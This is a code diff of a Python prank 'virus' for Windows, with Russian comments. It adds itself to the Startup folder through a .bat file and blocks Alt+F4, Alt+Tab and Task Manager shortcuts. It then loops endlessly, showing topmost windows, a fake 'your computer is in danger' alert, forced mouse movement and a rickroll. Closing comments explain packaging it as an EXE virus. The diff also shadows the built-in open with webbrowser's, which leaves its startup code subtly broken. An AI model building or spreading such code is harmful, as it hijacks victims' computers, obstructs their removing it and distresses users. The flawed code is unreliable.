@@ -20,23 +20,35 @@
 # КОД
 
 # импортируем то что надо (изменяемо, не удаляемо)
-import ctypes
-import time
+from ctypes import WinDLL, windll
+from time import sleep
 from ctypes import wintypes
 import os
 import keyboard
-import random
+from random import choice
 import pygame
-import pyautogui
-import getpass
+from pyautogui import moveRel
+from getpass import getuser
 from pygame.draw import *
-import webbrowser
+from webbrowser import open
+
 
 pygame.init()
 
 # получаем имя пользователя (не изменяемо)
-USER_NAME = getpass.getuser()
-
+USER_NAME = getuser()
+# batnik = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME + r'open.bat'
+def Im_stupid_I_cant(screamer=False):
+    if screamer == True:
+        _PNG_IMAGE = 'download.jpg'
+        pygame.display.init()
+        img = pygame.image.load(_PNG_IMAGE)
+        screen = pygame.display.set_mode(img.get_size(), pygame.FULLSCREEN)
+        screen.blit(img, (0, 0))
+        pygame.display.flip()
+        pygame.quit()
+    # os.remove(batnik)
+    os.abort()
 
 # функция добавляющаяся в автозагрузку зависит от USER_NAME (не изменяемо)
 def add_to_startup(file_path=""):
@@ -46,17 +58,22 @@ def add_to_startup(file_path=""):
     with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
         bat_file.write(r'start "" %s' % file_path)
 
+add_to_startup('')
 
-# убиваем chrome(удаляемо, неизменяемо), os.system("-->taskkill /IM chrome.exe<--")
-os.system("taskkill /IM chrome.exe")
+# убиваем chrome(удаляемо, изменяемо), os.system("-->taskkill /IM chrome.exe<--")
+# os.system("taskkill /IM chrome.exe")
 
 # блокируем нажатия клавиш(изменяемо), keyboard.add_hotkey("-->alt + f4<--", None suppress=True)
 keyboard.add_hotkey("alt + f4", lambda: None, suppress=True)
 keyboard.add_hotkey("alt + tab", lambda: None, suppress=True)
 keyboard.add_hotkey("Ctrl + Shift + Esc", lambda: None, suppress=True)
-keyboard.add_hotkey("Alt +Esc", lambda: None, suppress=True)
-keyboard.add_hotkey("Ctrl +Esc", lambda: None, suppress=True)
+keyboard.add_hotkey("Alt + Esc", lambda: None, suppress=True)
+keyboard.add_hotkey("Ctrl + Esc", lambda: None, suppress=True)
 keyboard.add_hotkey("f1", lambda: None, suppress=True)
+
+# сочетвние клавиш на экстренную остановку программы (изменяемо, удаляемо)
+# keyboard.add_hotkey("-->Ctrl + `<--", lambda: os.abort(), suppress=True)
+keyboard.add_hotkey("Ctrl + S", lambda: Im_stupid_I_cant(False), suppress=True)
 
 
 # создание случайного названия (удаляемо, не изменяемо)
@@ -65,8 +82,8 @@ def random_name(length):
     alpha = 'abcdefghijklmnopqrstuvwxyz'
     idshnik = 'joke_'
     for i in range(0, length, 2):
-        idshnik += random.choice(number)
-        idshnik += random.choice(alpha)
+        idshnik += choice(number)
+        idshnik += choice(alpha)
     return idshnik
 
 
@@ -80,7 +97,6 @@ def fold(col):
 
 # что нам делать:
 # =====================================================================================================================
-
 # создаём картинки (кодик,удаляемо)
 # бесконечный цикл ಠ益ಠ
 while True:
@@ -117,7 +133,7 @@ while True:
     finished = False
     hwnd = pygame.display.get_wm_info()['window']
     # делаем поверх других окон
-    user32 = ctypes.WinDLL("user32")
+    user32 = WinDLL("user32")
     user32.SetWindowPos.restype = wintypes.HWND
     user32.SetWindowPos.argtypes = [wintypes.HWND, wintypes.HWND, wintypes.INT, wintypes.INT, wintypes.INT,
                                     wintypes.INT, wintypes.UINT]
@@ -130,17 +146,18 @@ while True:
                 # двигаем мышкой и запускаем рикролл :-) (кодик, удаляемо)
                 for u in range(1):
                     try:
-                        webbrowser.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley', new=0)
-                        pyautogui.moveRel(500, 500, duration=0.25)
-                        pyautogui.moveRel(-300, -300, duration=0.25)
+                        windll.user32.MessageBoxW(None, "Ну теперь попробуй словить меня!\nСам скачал...\nP.S. если не можешь нажми Ctrl + S", "Ваш компьютер подвергается опасности", 0)
+                        open('https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley', new=0)
+                        moveRel(500, 500, duration=0.25)
+                        moveRel(-300, -300, duration=0.25)
                     except:
                         pass
                     # не трогай если не удаляешь вывод чего-либо(не изменяемо)
                 finished = True
     pygame.quit()
-    time.sleep(300)
+    sleep(300)
 # =====================================================================================================================
 
-# для создания EXE файла в консоль пишешь: pyinstaller --onefole --noconsole название_файла.py
+# для создания EXE файла в консоль пишешь: pyinstaller --onefile --noconsole название_файла.py
 # находишь в папке проекта папку dist и вот твой EXE вирус
 # план по захвату человечества ГОТОВ на 100%
